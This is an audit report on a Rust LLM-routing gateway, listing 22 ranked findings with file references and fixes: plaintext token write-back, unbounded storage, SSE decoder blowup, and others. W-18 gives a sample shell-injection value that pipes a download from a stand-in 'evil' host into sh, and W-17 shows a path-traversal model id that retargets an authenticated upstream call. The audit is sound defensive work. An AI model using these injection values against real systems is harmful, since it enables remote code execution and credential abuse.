# Weakness audit

> Scope: production Rust code under `crates/` (workspace, 16.5k LOC) at commit
> `51dfe6d` + working tree, read 2026-10-02. `desktop/src-tauri` is excluded from
> the workspace and was not audited. Findings are ranked P0 (none found) →
> P1 (production-impacting) → P2 (significant, bounded) → P3 (minor/hygiene).
> Every finding cites `file:line`. Nothing in the repository was modified.

## Summary table

| ID | Sev | Area | One-line | Evidence |
|----|-----|------|-----------|----------|
| W-01 | P1 | correctness | Upstream errors delivered inside a 2xx/SSE body lose their status → breaker trips and the client gets 502 for what is a 4xx/429 | `routing.rs:44`, `lib.rs:548` |
| W-02 | P1 | security | Refreshed OAuth token is written to `provider_connections` in plaintext whenever `STORAGE_ENCRYPTION_KEY` is absent | `main.rs:111` |
| W-03 | P1 | reliability | Responses state store has no TTL/retention: every non-stream call appends the full request+response to `key_value` forever | `lib.rs:606` |
| W-04 | P2 | security | Stored conversation content is unencrypted and lands in `storage.sqlite-wal`, which is never permission-hardened (0644) | `main.rs:390` |
| W-05 | P1 | reliability | `GET /api/logs/app` reads the whole log file into RAM and allocates every line as a `String`, synchronously inside an async handler | `admin.rs:522` |
| W-06 | P1 | security/reliability | SSE decoder grows `buffer`/`frame` without bound on a newline-less upstream and drains per line → O(n²) | `sse.rs:37` |
| W-07 | P2 | correctness | `HttpClient`'s 600 s *total* request timeout also caps streaming bodies → long generations are truncated and then reported as upstream errors | `client.rs:36` |
| W-08 | P2 | concurrency | Gemini's `last_message_id` is one process-global slot: parallel sessions inject each other's thought signatures | `gemini.rs:38` |
| W-09 | P2 | concurrency | Breaker has no half-open single-flight and no ordering guard: a late success closes a breaker just opened, and the whole herd is admitted after cooldown | `breaker.rs:52` |
| W-10 | P2 | correctness | `load_combos` swallows `prepare`/`query`/row errors and returns an empty map → combo routing silently degrades to "unknown model" | `combos.rs:187` |
| W-11 | P2 | performance | Every request runs `load_combos` twice (full table scan + JSON parse); the preloaded `combo_configs` map is dead code | `routing.rs:126` |
| W-12 | P2 | concurrency | One `Mutex<Connection>` for the whole process, and every request — including `GET /v1/models` — writes (`touch_api_key`, usage, call log) | `db.rs:29`, `auth.rs:121` |
| W-13 | P2 | security | The value stored in `api_keys.key` is the SHA-256 of the secret, and that column is matched as a bearer token → the stored hash is a valid credential | `repos.rs:246` |
| W-14 | P2 | correctness | `load_credentials` skips rows whose `expires_at` is unparseable, contradicting its own documented "never hide a credential" contract | `credentials.rs:68` |
| W-15 | P2 | tests | Zero tests for the 10 `/api/*` admin handlers and for `ManageAuthenticated` — the `manage`-scope boundary is unasserted | `admin.rs:769`, `auth.rs:73` |
| W-16 | P3 | correctness | Credential-rotation loops use a shared round-robin counter, so "try every credential" can retry the same failing key N times, and any 4xx is retried | `grok_cli.rs:531` |
| W-17 | P3 | correctness | Gemini URL is built by interpolating the client-supplied model id, so `provider/../../x` retargets the upstream path (with the operator's API key) | `gemini.rs:315` |
| W-18 | P3 | security | Restart builds `sh -c "…{label}…"` from an env-sourced label → shell metacharacters are interpreted | `restart.rs:46` |
| W-19 | P3 | correctness | `count_active_api_keys` counts banned/inactive/expired keys, so the dashboard over-reports usable keys | `repos.rs:943` |
| W-20 | P3 | correctness | `Json` extractor rejections bypass `error_response`: malformed bodies get a plain-text 400/422 instead of the `{"error":{…}}` envelope | `lib.rs:228` |
| W-21 | P3 | tests | 22 wiremock `.expect(n)` expectations and zero `verify()` calls: those expectations assert nothing | `openai.rs:652` |
| W-22 | P3 | performance | `registry.json` is re-parsed twice at boot and `/v1/models` does a provider × backend linear scan per request | `registry.rs:65`, `lib.rs:209` |

## Findings

### W-01 P1 — Status classification is string-parsed, and every in-body upstream error falls through to "outage"

`crates/heterion-router-gateway/src/routing.rs:44-65`, `crates/heterion-router-gateway/src/lib.rs:548-573`

**What.** The HTTP status of an upstream failure is not carried in the error type.
`GatewayError::Upstream(String)` holds a message, and two independent parsers
recover the code by `strip_prefix("upstream status ")`:
`routing.rs:58` (`upstream_status`) and `lib.rs:548`. Three decisions are derived
from that parse:

* `is_backend_outage` (`routing.rs:44`) — `None => true`, i.e. "no status ⇒ the
  backend is unhealthy" ⇒ `record_failure` (`routing.rs:229`, `routing.rs:302`).
* `is_transient` (`routing.rs:138`) — `None => true` ⇒ retry.
* `error_status` (`lib.rs:558`) — `_ => 502 BAD_GATEWAY`.

**Why it matters.** Only `HttpError::Status` produces the `"upstream status N: …"`
prefix (`crates/heterion-router-http/src/client.rs:64-68`, `:96-101`). Every
error the executors extract *from a successful HTTP response* is re-wrapped
without it:

* `openai.rs:145-151` and `openai.rs:508-514` — `{"error":{"message":…}}` in a 200 body / SSE frame.
* `responses.rs:188-195`, `gemini.rs:447-454`, `grok_cli.rs:335-341`.
* `translate/responses.rs:501-509` (`error_message`) via `Converted::Fail`
  (`responses.rs:133-135`, `grok_cli.rs:492-494`) and `translate/gemini.rs:165-177`.

So a provider that answers `200 {"error":{"message":"rate limit"}}`, or streams a
`response.failed` event, is classified as an outage: the breaker opens after
`threshold` (default 3) such events for 60 s (`breaker.rs:67`), every other model
on that provider is shed, and the client receives `502` instead of `429`. This
directly contradicts the frozen contract in `AGENTS.md:42` ("4xx upstream must not
trip the breaker") and the doc comment at `routing.rs:37-43`, which explicitly
names "model not found" / "no access" / "bad payload" as healthy cases. The SSE
form is the common case, since providers report mid-stream failures as events.

**Reasoning / repro.** `upstream_status("rate limit")` → `strip_prefix` → `None`
(covered by the existing test at `routing.rs:466` for `"transport error"`), and
`GatewayError::Upstream("rate limit").status()` → `BAD_GATEWAY` per the `_ =>`
arm at `lib.rs:570`. Add a wiremock whose `/chat/completions` returns
`200 {"error":{"message":"rate limit"}}` and assert (a) HTTP status `502`,
(b) that after 3 calls the second model on the same backend is refused with
"breaker cooldown" (`routing.rs:68`).

**Minimal fix.** Add a typed status to the error, e.g.
`GatewayError::Upstream { status: Option<u16>, message: String }`, and have
`HttpClient` populate it (`client.rs:64`, `client.rs:96`). Then
`is_backend_outage` = `status.map_or(true, |s| s >= 500)`,
`is_transient` = `status.map_or(true, |s| s == 429 || s >= 500)`, and
`error_status` maps the real code. For bodies that carry a machine code
(`error.code`, `error.type`) map the well-known ones (`rate_limit`, `429`,
`insufficient_quota`) before falling back to "unknown ⇒ do not trip".

---

### W-02 P1 — Token write-back silently degrades to plaintext when no storage key is configured

`crates/heterion-router-gateway/src/main.rs:107-130`

**What.** The Grok refresh callback encrypts with `FieldCrypto` when one was
built from `STORAGE_ENCRYPTION_KEY`:

```rust
let access_token = refresh_crypto.as_ref().map(|c| c.encrypt(token))
    .unwrap_or_else(|| token.to_string());          // main.rs:111-114
```

`refresh_crypto` is `None` whenever `load_secret` (`crypto/src/lib.rs:159`) finds
no key — a supported configuration. The callback then persists the new access
token *and* refresh token in cleartext (`main.rs:121-129` →
`repos.rs:137-153`). The write is unconditional once a refresh happens, and
nothing logs that encryption is off.

**Why it matters.** The credential that was just refreshed (the highest-value
secret in the system) lands unencrypted in `provider_connections`, which is
readable by the dashboard layer and by any process with the data dir open. It
also breaks the invariant `credentials.rs:80-84` relies on (dropping
`enc:v1:` values when no crypto is present): after one refresh the row is
plaintext, so a later boot with the key present will pass it through unchanged
(`crypto/src/lib.rs:108-110`) rather than decrypting it — the key and the stored
value silently diverge.

**Minimal fix.** Fail closed: refuse the refresh (or skip write-back) and log at
`warn` when `crypto` is `None` and the row is currently encrypted; at minimum
require an explicit `HETERION_ROUTER_ALLOW_PLAINTEXT_TOKENS=1`.

---

### W-03 P1 — Responses state store is unbounded: no TTL, no size cap, no retention

`crates/heterion-router-gateway/src/lib.rs:606-631`, `:863-866`, `:836`

**What.** `should_store` defaults to `true` (`lib.rs:866`), and
`persist_response` (`lib.rs:606`) writes a record containing the **entire
request** (`"request": request`, `lib.rs:622`) and the entire response
(`lib.rs:623`) into `key_value` under the `responses` namespace, keyed by the
upstream response id. The only removal path in the whole workspace is an explicit
client `DELETE /v1/responses/{id}` (`lib.rs:836`); there is no TTL, no row cap,
no `VACUUM`, and no sweep (`rg 'prune|retention|VACUUM' crates` → no hits).

**Why it matters.** Each entry can be megabytes (a long agent transcript replayed
via `previous_response_id` is stored *and* re-embedded into the next request at
`lib.rs:774-788`, so the rows grow superlinearly with conversation length). On a
long-lived gateway the SQLite file grows without bound until the disk fills —
and because every request path shares one connection and one lock (`db.rs:29`),
a full disk turns every request into a write error that is only logged
(`lib.rs:341`, `lib.rs:364`).

**Minimal fix.** Cap the stored payload (e.g. skip bodies > 256 KiB), key on a
hashed id, and add a boot-time sweep keeping the newest N rows / rows younger
than T days for the `responses` namespace.

---

### W-04 P2 — Unencrypted conversation content is exposed through an unhardened WAL file

`crates/heterion-router-gateway/src/main.rs:359-368` (order: `:390` then `:409`), `crates/heterion-router-db/src/db.rs:53-63`

**What.** `restrict_data_files` chmods `0600` every *existing* file in the data
dir, and it runs at `main.rs:390` — **before** `Db::open` at `main.rs:409`.
`Db::open` chmods only the main database file (`db.rs:61`); SQLite then creates
`storage.sqlite-wal` and `storage.sqlite-shm` itself, after the permission pass,
and honours the process umask. Verified on this host:

```
$ umask → 022
$ sqlite3 $d/storage.sqlite "PRAGMA journal_mode=WAL; CREATE TABLE t(a); INSERT INTO t VALUES(1);"
-rw-r--r--  storage.sqlite-shm
-rw-r--r--  storage.sqlite-wal
```

The same ordering bug leaves `gateway.log` (`main.rs:393`) and
`gemini-thought-signatures.jsonl` (`main.rs:154`) at 0644.

**Why it matters.** The WAL holds committed pages of the whole database: legacy
plaintext API keys, `api_keys.key` hashes, and — per W-03 — full prompt and
completion text for every stored Responses call. Mitigating factor: the
directory itself is `0700` (`db.rs:58`), so a *different* local user cannot
traverse into it; exposure is limited to root, to backup/sync tooling that reads
by path, and to anything that later relaxes the directory mode.

**Minimal fix.** Run the permission pass *after* `Db::open` and after the log
appender is created (or re-run it on each daily rotation); alternatively set
`SQLITE_TMPDIR`/pre-create `-wal`/`-shm` with `0600` via
`OpenFlags`, or drop to `journal_mode=TRUNCATE`/`DELETE` on the shared file.

---

### W-05 P1 — `/api/logs/app` loads the entire log file (and every line) into memory

`crates/heterion-router-gateway/src/admin.rs:511-532`

```rust
let lines = match std::fs::read_to_string(&log_path) {        // admin.rs:522
    Ok(content) => {
        let all: Vec<String> = content.lines().map(String::from).collect();  // :524
        let start = all.len().saturating_sub(limit);
        all[start..].to_vec()
    }
```

**Why it matters.** `tracing_appender::rolling::daily` (`main.rs:393`) rotates by
*day*, not by size, so `gateway.log` grows without limit within a day. A
`manage`-scoped `GET /api/logs/app?limit=50` therefore allocates the whole file
plus one heap `String` per line to return 50 of them — a trivial amplification
(ratio ≈ file size × ~2), and a synchronous blocking read inside an async handler
that parks a tokio worker thread. Repeated calls are a cheap memory-exhaustion
lever.

**Minimal fix.** Read only the tail: seek to `len - 256 KiB` (via
`tokio::fs::File` + `seek`), then keep a `VecDeque` of the last `limit` lines.
Move the read into `spawn_blocking` for good measure.

---

### W-06 P1 — SSE decoder: unbounded buffering and O(n²) draining on upstream-controlled input

`crates/heterion-router-http/src/sse.rs:36-53`

```rust
self.buffer.extend_from_slice(chunk);                       // sse.rs:37
while let Some((line_end, delimiter_len)) = next_line(&self.buffer) {
    let line_bytes: Vec<u8> = self.buffer.drain(..line_end + delimiter_len).collect(); // :40
```

**Why it matters.** Two problems, both driven purely by upstream bytes:

1. **Unbounded.** If an upstream (or a MITM on a `http://` provider, or a
   compromised provider) sends a line without `\n`/`\r`, `next_line` returns
   `None` forever and `buffer` grows without limit; `frame` likewise accumulates
   every line of a frame that never terminates (`sse.rs:48`). There is no cap
   anywhere in the module.
2. **O(n²).** `drain(..)` shifts the entire remaining buffer for *each* line, and
   `next_line` rescans from index 0 every iteration. A single 1 MiB chunk
   containing 10k lines costs ~10 GiB of memmove.

**Minimal fix.** Track a `scan_from` cursor instead of re-scanning, consume with
`split_off`/`copy_within` or `VecDeque`, and return an explicit `Err`/drop the
frame when `buffer.len()` or `frame.len()` exceeds a cap (e.g. 8 MiB) — the
caller already maps a decode problem to `GatewayError::Upstream`.

---

### W-07 P2 — The 600 s *total* request timeout also applies to streaming bodies

`crates/heterion-router-http/src/client.rs:34-39`, `crates/heterion-router-gateway/src/openai.rs:39`, `:63-69`, `grok_cli.rs:195`, `gemini.rs:295`, `responses.rs:44`

**What.** `HttpClient::new(600)` sets `reqwest::ClientBuilder::timeout`, which is
a deadline covering *response body download*, not just the response headers. All
four executors build their client that way and then use it for the SSE call that
carries the whole generation (`openai.rs:63-69`, `responses.rs:81-85`,
`grok_cli.rs:397-406`, `gemini.rs:344-348`).

**Why it matters.** A reasoning model that streams for more than 10 minutes is
cut off mid-answer. The stream then ends without a terminal event, so
`drive_stream` returns `Err(Upstream("upstream stream ended before terminal
event"))` (`openai.rs:112-116`, `responses.rs:140-144`, `grok_cli.rs:499-503`,
`gemini.rs:396-400`) — the client has already received partial content and now
gets an error frame on top of it, and per W-01 that error also counts against
the provider's breaker.

**Minimal fix.** Build two clients (or use `read_timeout` for streaming):
`.timeout(...)` only for buffered `complete()`, and
`.read_timeout(Duration::from_secs(600))` (or `None` plus an
`idle`-based watchdog on `bytes_stream()`) for `stream()`. An explicit
idle-timeout on the byte stream is better than a wall-clock cap: it distinguishes
"slow" from "dead".

---

### W-08 P2 — Gemini thought-signature fallback is a single process-global slot shared by all sessions

`crates/heterion-router-gateway/src/gemini.rs:38`, `:338`, `:380`, `:421`, `:459`, `:498`

**What.** `last_message_id: Arc<Mutex<Option<String>>>` is set from whichever
stream last produced a tool call (`gemini.rs:380`, `:498`) and read on the *next*
request of *any* session (`gemini.rs:338`, `:421`) as the fallback key
`{message_id}-{index}` in `inject_signatures` (`gemini.rs:248-251`).

**Why it matters.** Two concurrent Gemini sessions (two agents, or two API keys
behind the same backend) overwrite each other's slot. Session B then replays a
tool call whose own signature the client dropped, and the gateway injects session
A's signature under B's call id. Upstream Gemini then rejects the replayed
`functionCall` (400) or, worse, accepts a signature belonging to another
conversation — cross-session contamination of provider-side reasoning state.
The write is also done while holding a `std::sync::Mutex` inside an async task.

**Minimal fix.** Key the fallback by conversation: store a map
`(model, first_user_message_hash) → last_message_id`, or simply drop the
`last_message_id` fallback and rely on the client's echoed `call.id`
(`gemini.rs:240-247` already prefers it).

---

### W-09 P2 — Breaker: no half-open single-flight, and success/failure order decides state

`crates/heterion-router-routing/src/breaker.rs:52-72`, `crates/heterion-router-gateway/src/routing.rs:213-230`

**What.** `allow()` (`breaker.rs:52`) returns `true` for every caller once the
cooldown elapses and never transitions to a half-open/probing state. Callers in
`routing.rs:213` and `routing.rs:276` re-check it once per attempt, so N
concurrent requests all pass at the same instant.

**Why it matters.**

* *Thundering herd*: at cooldown expiry every in-flight request is admitted to the
  backend that just failed `threshold` times, re-creating the load spike the
  breaker was opened to shed.
* *Ordering assumption*: `record_success` (`breaker.rs:60`) unconditionally clears
  `failures`/`opened_at`. With concurrent attempts, a request that started
  *before* the failure that opened the breaker can complete afterwards and close
  it again — breaker state depends on completion order, not failure order, so a
  dead provider flaps between `Open` and `Closed` instead of staying open.

**Minimal fix.** Model a `HalfOpen { probe_in_flight: bool }` state: `allow()`
returns `true` at most once per cooldown window; `record_failure` while
half-open re-opens with a fresh `opened_at`; `record_success` only closes when
the breaker was actually in the probing slot.

---

### W-10 P2 — `load_combos` swallows every DB error and returns an empty map

`crates/heterion-router-gateway/src/combos.rs:185-206`

```rust
let mut statement = match conn.prepare("SELECT name, data FROM combos") {
    Ok(statement) => statement,
    Err(_) => return map,                       // combos.rs:187-190
};
let rows = match statement.query_map(...) {
    Ok(rows) => rows,
    Err(_) => return map,                       // combos.rs:193-196
};
for row in rows.flatten() { ... }                // combos.rs:197 — row errors dropped
```

**Why it matters.** There is no `Result` and no log. A `SQLITE_BUSY`, a
corrupted row, or a transient I/O error is indistinguishable from "no combos
configured". The call sites (`routing.rs:129`, `routing.rs:175`) then fall
through to prefix routing and finally to `no_candidate` (`routing.rs:75`), so a
DB hiccup surfaces to the client as `404 unknown model` and the dashboard's
dispatch verdicts flip to `servable: false` (`admin.rs:105-134`) with no operator
signal. This is exactly the "silent loss" class ADR-011 §"схема ≠ enforcement"
targets.

**Minimal fix.** Return `Result<HashMap<_,_>>` and `tracing::warn!` on each
error; at the call sites, distinguish "no combos" from "combos unreadable" and
surface the latter as a 503 rather than a 404.

---

### W-11 P2 — Per-request combo reload ×2, and the preloaded cache is dead code

`crates/heterion-router-gateway/src/routing.rs:34`, `:100`, `:115`, `:126-135`, `:173-177`

**What.** `with_combo_source` builds a `combo_configs: Arc<HashMap<String, ComboConfig>>`
snapshot at startup (`routing.rs:105-117`), and **nothing ever reads it** —
`rg 'combo_configs'` shows only the declaration and the two assignments. Instead
every request performs two full `load_combos` calls: one in `combo_config`
(`routing.rs:127-132`, invoked at `routing.rs:205` and `:265`) and one in `plan`
(`routing.rs:174-177`). Each call is a `SELECT name, data FROM combos` plus a
`serde_json::from_str` per row, plus a `HashSet` build from the backend keys
(`routing.rs:177`).

**Why it matters.** With 8 live combos this is 16 table scans + 16 JSON parses on
*every* request — including `GET /v1/models`-adjacent paths and all failures,
where latency is already user-visible. The dead field also hides the fact that
combo edits (`PATCH /api/combos/{id}`) are re-read from SQLite on every request,
which is why the "takes effect immediately" claim at `admin.rs:600-605` is true
at the cost of the per-request scan.

**Minimal fix.** Consult `combo_configs` for the config lookup and keep a
single `load_combos` inside `plan` (or better, cache with a short TTL /
generation counter bumped by the admin handlers); delete the unused field if the
cache is not adopted.

---

### W-12 P2 — Single-connection SQLite behind one `std::sync::Mutex`, with a write on every request

`crates/heterion-router-db/src/db.rs:28-30`, `:129-133`, `crates/heterion-router-gateway/src/auth.rs:106-123`, `crates/heterion-router-gateway/src/lib.rs:323-365`

**What.** `Db` owns exactly one `Connection` in a blocking `Mutex`
(`db.rs:29`). Per authenticated request the gateway performs, on that single
handle: `SELECT COUNT(*) FROM api_keys` (`auth.rs:108`), the key lookup
(`auth.rs:119`), an **`UPDATE api_keys SET last_used_at`** (`auth.rs:121` →
`repos.rs:318`), then two accounting inserts (`lib.rs:340`, `lib.rs:363`), plus
`kv_set` for Responses (`lib.rs:627`) and a `UPDATE combos`/`provider_connections`
for admin mutations.

**Why it matters.**

* `MutexGuard` acquisition is a *thread* block, not a task block: every worker
  that contends parks the whole tokio worker thread while SQLite does its I/O.
* Three writes per request turn `api_keys` into a write-hot row; under WAL every
  request appends a frame, so WAL grows and readers on the shared SQLite
  boundary (ADR-001: the Node server owns the same file) contend with
  `busy_timeout = 2000` (`db.rs:36`) — under load this shows up as
  `database is locked` errors that are only logged.
* `GET /v1/models` and other read-only endpoints write to the database, so
  read-only traffic is not read-only.

**Minimal fix.** Wrap DB work in `spawn_blocking`, throttle
`touch_api_key` (e.g. at most once per key per minute, tracked in an
`AtomicU64` last-touched bucket), and batch the usage + call-log inserts in one
transaction.

---

### W-13 P2 — The stored `api_keys.key` is a SHA-256 hash and is itself accepted as a bearer token

`crates/heterion-router-db/src/repos.rs:226-256` (hash written into `key` at `:246`), `:353-364`, `crates/heterion-router-gateway/src/auth.rs:119`

**What.** `insert_full_api_key` binds `row.key_hash` to **both** `?3` (`key`) and
`?7` (`key_hash`). `find_usable_api_key` then matches
`WHERE (key = ?1 OR key_hash = ?2)` where `?2 = api_key_hash(token)`. So the
hex digest sitting in `api_keys.key` authenticates as a bearer token.

**Why it matters.** The value shown to a dashboard user, copied out of a backup,
or read by any process with database access is a *working credential*, and the
hash is not rotatable-by-omission the way a plaintext secret would be (both
columns hold it). It also defeats the point of hashing at rest. The lookup path
is the auth hot path and `key_hash` has no index (`schema_base.sql:90` creates
`idx_ak_key` only), so the `OR` can force a scan of `api_keys`.

**Minimal fix.** Store an empty string (or a sentinel that is never a valid
digest) in `key` for hash-issued keys and match `key_hash` only; add
`CREATE INDEX IF NOT EXISTS idx_ak_key_hash ON api_keys(key_hash)` in a
migration.

---

### W-14 P2 — Credentials with an unparseable `expires_at` are silently dropped, contradicting the documented intent

`crates/heterion-router-gateway/src/credentials.rs:63-70` vs `:121-134`

```rust
let expired = is_expired(expires_at.as_deref());
if expired.is_err() || (expired == Ok(true) && refresh_token_raw.is_none()) {
    continue;                                     // credentials.rs:68
```

`is_expired` is documented at `credentials.rs:121-123` as: *"Unparseable values
are treated as 'not expired' so an odd timestamp never hides a credential."*
The implementation returns `Err(())` for unparseable input and the **caller**
skips the row, so the documented behaviour never happens.

**Why it matters.** `expires_at` is written by two writers with different
spellings (the Node server and the JS dashboard). A single unrecognised format
(`"2026-09-17T13:00:00+02:00"` is handled, but `"2026-09-17 13:00:00 UTC"` or a
trailing `"Z"` on a space-separated stamp is not — see `parse_rfc3339_seconds`,
`credentials.rs:138-172`) makes the provider disappear from the backend set at
startup with no log line. Note `load_credentials` returns `Ok(vec![])` for that
case, so `main.rs:188`/`main.rs:257` just `continue` — the backend is never
registered and the failure looks like "no credentials configured".

**Minimal fix.** Either make the caller honour the documented contract
(`if expired == Ok(true) && refresh_token_raw.is_none() { continue }`, i.e.
treat `Err` as not-expired) and log a `warn!` naming the connection id, or change
the doc. Prefer the former plus the log.

---

### W-15 P2 — The admin HTTP surface (10 handlers) and the `manage` scope check have no tests

`crates/heterion-router-gateway/src/admin.rs:769-783` (the only `#[cfg(test)]`
module: one test for `application_log_path`), `crates/heterion-router-gateway/src/auth.rs:73-93`

**What.** `admin.rs` is 783 lines of security-relevant code — key issuance
(`admin.rs:240`), revoke/restore (`:318`, `:327`), combo and connection
mutation (`:606`, `:716`), usage/log endpoints (`:406`, `:449`, `:511`) — with a
single unit test that never touches a handler. `ManageAuthenticated`
(`auth.rs:73-93`) has no test at all: the `scopes` parse-fail → `false` path, the
`None` key → allow path, and the `forbidden("manage scope required")` response
are unasserted. Test counts per file (`rg -c '#\[(tokio::)?test\]'`):
`admin.rs` 1, `auth.rs` 3 (all on the *other* extractor), and the only
gateway-level integration test (`crates/heterion-router-gateway/tests/upstream_harness.rs:14`)
does not call the gateway at all — it `reqwest::get`s a mock.

**Why it matters.** The 400/403/404/409/500 mapping in `update_combo`
(`admin.rs:606-709`) and `update_connection` (`:716-767`), the `is_unique_violation`
string sniff (`admin.rs:596-598`), the `weight`/name/strategy validation, and the
"secret returned exactly once" property of `create_key` (`:287-297`) are all
unverified. A regression here is a silent authorization or data-loss bug.

**Minimal fix.** Table-driven `Router::oneshot` tests over an in-memory DB:
`POST /api/keys` without a `manage` key → 403; with one → 201 and the secret
appears exactly once (and never in `GET /api/keys`); `PATCH /api/combos/{id}`
duplicate name → 409, unknown id → 404, `{"strategy":"bogus"}` → 400.

---

### W-16 P3 — Credential rotation loops can retry the same credential, and retry non-transient 4xx

`crates/heterion-router-gateway/src/grok_cli.rs:530-532`, `gemini.rs:427-428`, `openai.rs:558-561`, `responses.rs:169-197`

```rust
for _ in 0..self.credential_count() {
    let (index, credential) = self.next_credential();   // grok_cli.rs:531-532
```

**What.** `next_credential` (`grok_cli.rs:225-233`) advances a *process-global*
`AtomicUsize` round-robin counter, so under concurrency the loop can draw the same
index `credential_count` times — it does not actually "try every credential".
The same loops (`gemini.rs:427`, `openai.rs:558`, `responses.rs:169`) `continue`
on **every** error, including a 400 `invalid payload` or a 404 `model not found`
replayed through `HttpError::Status`, with no delay and no `Retry-After` honour.

**Why it matters.** With 5 keys and a client-side error, one user request becomes
5 identical upstream requests (5× cost, 5× rate-limit pressure). With
concurrency, the "rotation" degenerates into repeated hammering of one dead key,
which is what the breaker is supposed to stop (and per W-01 a 4xx can trip it).

**Minimal fix.** Iterate over `0..pool_len()` with `index = (start + offset) % len`
so each attempt is a distinct credential, `break` on non-transient errors
(reuse the `is_transient` predicate), and sleep with the upstream's `Retry-After`
on 429.

---

### W-17 P3 — Gemini upstream URL is built from the client-supplied model id

`crates/heterion-router-gateway/src/gemini.rs:315-321`, route split at `crates/heterion-router-gateway/src/routing.rs:160-171`

**What.** `method_url` does `format!("{}/{}:generateContent", self.base_url,
model)`. For a `provider/model` request, `routing.rs:160-169` splits on the first
`/` and passes the remainder through as the bare model, so a client that sends
`{"model": "gemini/../../admin/secret"}` produces
`…/v1beta/../../admin/secret:generateContent`, which `url` normalises to a
different path on the Google host, sent **with the operator's `x-goog-api-key`
header** (`gemini.rs:346`).

**Why it matters.** Host is fixed (no full SSRF), so the blast radius is "any
path on the Gemini host, authenticated as the operator", reachable by any client
holding a `/v1/chat/completions` key. It also breaks the routing contract that the
model id is opaque.

**Minimal fix.** Percent-encode the model segment and reject ids containing `/`
beyond the expected vendor prefix (e.g. `models/`), e.g.
`url::Url::path_segments_mut().push(model)`.

---

### W-18 P3 — Restart interpolates an env-sourced label into `sh -c`

`crates/heterion-router-gateway/src/restart.rs:45-47`, `:62-69`

```rust
format!("sleep 2; exec launchctl kickstart -k gui/{uid}/{label}")   // restart.rs:46
std::process::Command::new("sh").args(["-c", &kickstart_script(label, uid)]) // :63-64
```

**What.** `label` comes from `HETERION_ROUTER_SERVICE_LABEL` /
`OMNIROUTE_SERVICE_LABEL` (`restart.rs:14-28`) with no charset validation, and is
passed to `sh -c` as part of the command string.

**Why it matters.** A label such as `x; curl evil|sh; #` executes. The value is
operator-controlled (not remote), so this is not remotely exploitable, but it is a
command-injection sink reachable from an environment variable and there is a
second one: `admin::restart_service` (`admin.rs:379-402`) calls
`is_supervised` (`restart.rs:50-58`) and `request_restart` (`:62`), both blocking
`std::process::Command` calls executed directly on the async runtime thread.

**Minimal fix.** Drop `sh -c`: spawn `sleep`/`launchctl` as two argv-based
commands (or use `Command::new("launchctl").args(["kickstart","-k", &job])` after
a detached timer), and wrap the supervision probe in `spawn_blocking`.

---

### W-19 P3 — `count_active_api_keys` counts keys that cannot authenticate

`crates/heterion-router-db/src/repos.rs:941-948`

```sql
SELECT COUNT(*) FROM api_keys WHERE revoked_at IS NULL
```

**Why it matters.** It ignores `is_banned`, `is_active = 0` and `expires_at` —
exactly the three kill switches `find_usable_api_key` enforces
(`repos.rs:362-363`, `repos.rs:385-388`). `GET /api/overview` reports this as
`counts.api_keys` (`admin.rs:68`), so the dashboard can show "3 keys" while only
one works, and the operator's only readiness signal for a non-loopback bind
(`main.rs:370-384`) disagrees with what the dashboard shows.

**Minimal fix.** Apply the same predicates, and reuse one shared predicate
constant between the count and the lookup.

---

### W-20 P3 — `Json` extractor rejections bypass the sanitized error envelope

`crates/heterion-router-gateway/src/lib.rs:225-229`, `:858-862`, `admin.rs:243`

**What.** `chat_completions` takes `Json<ChatCompletionRequest>` and
`responses` takes `Json<Value>` as an extractor. A malformed or
schema-mismatched body is rejected by axum before the handler body runs, so it
never reaches `error_response`/`sanitized_error_payload` (`lib.rs:520-578`): the
client gets axum's plain-text `Failed to deserialize the JSON body…` with 422
(data error) or 400 (syntax error).

**Why it matters.** Two consequences: (a) an OpenAI-compatible client that
special-cases a `400` + `{"error":{"message":…}}` envelope now sees `422` with a
non-JSON body and cannot parse the failure; (b) the error-envelope invariant the
streaming path is explicitly tested for (`lib.rs:1423-1453`) is not enforced on
the non-streaming path.

**Minimal fix.** Take `body: Bytes` and call `serde_json::from_slice`, mapping
failures through `error_response(GatewayError::InvalidRequest(..))`; or add a
`HandleErrorLayer`/`Json` wrapper that re-renders rejections in the same envelope.

---

### W-21 P3 — 22 wiremock expectations, 0 `verify()` calls: those assertions assert nothing

`crates/heterion-router-gateway/src/openai.rs:652`, `:692`, `:736`, `:750`, `:830`; `crates/heterion-router-gateway/src/responses.rs:349`; `crates/heterion-router-gateway/tests/upstream_harness.rs:24`

```sh
$ rg -n '\.expect\([0-9]' crates -g '*.rs' | wc -l   # 22
$ rg -n 'verify\(\)'  crates -g '*.rs' | wc -l        # 0
```

**Why it matters.** `Mock::…expect(n)` only records a verification threshold;
without `server.verify().await` (or `Mock::verify().await`) nothing ever checks
it. The suite therefore never asserts that the gateway sent the expected number
of upstream calls, the expected headers, or the expected body — which is exactly
the coverage needed for the contract in `AGENTS.md:41` ("keyless backends send no
`Authorization`") and for retry/failover behaviour (a double-send bug would pass
today). `upstream_harness.rs` is the only gateway integration test and does not
exercise the gateway.

**Minimal fix.** Add `server.verify().await;` at the end of each such test, and
add a header assertion for the keyless case (`AGENTS.md:41`).

---

### W-22 P3 — `registry.json` parsed twice at boot; `/v1/models` and `/api/connections` do nested linear scans

`crates/heterion-router-providers/src/registry.rs:63-67`, `crates/heterion-router-gateway/src/main.rs:151` and `:316`, `crates/heterion-router-gateway/src/lib.rs:207-221`, `crates/heterion-router-gateway/src/admin.rs:145-162`

**What.** `ProviderRegistry::load()` re-runs `serde_json::from_str(include_str!(…))`
on every call (278 providers / 2717 models) — called twice during `select_backend`
(`main.rs:151` and again at `main.rs:316`) with the first instance thrown away.
In the request path, `list_models` iterates all 278 registry entries and, for each,
does a linear `backend_names.iter().any(...)` scan (`lib.rs:208-211`) before
emitting that provider's models; `admin::connections` does the same nesting
(`admin.rs:148-158`).

**Why it matters.** Boot cost is duplicated and a public, unauthenticated-ish
endpoint (`/v1/models`, `lib.rs:181`) walks `providers × backends` plus all
models of every live provider on every call — with 19 backends that is >5 000
string comparisons before serialising ~2 000 model objects. The dashboard's
connections page re-does it per request.

**Minimal fix.** Memoise `load()` behind a `OnceLock<ProviderRegistry>` (the type
is already cheaply `Arc`-able and cloned into `AppState`), and precompute a
`HashSet<&str>` of live backend names (and alias-resolved names) once at startup
instead of re-deriving per call.

## Commands run

All read-only; no file in the repository was modified, no target directory was
removed, nothing under `~/.heterion-router` or `~/.omniroute` was touched.

| Command | Outcome |
|---------|---------|
| `ls -la /Users/egorich/ai-workstation/Projects/heterion-router` | 10 crates + `desktop/`; workspace excluded `desktop/src-tauri` |
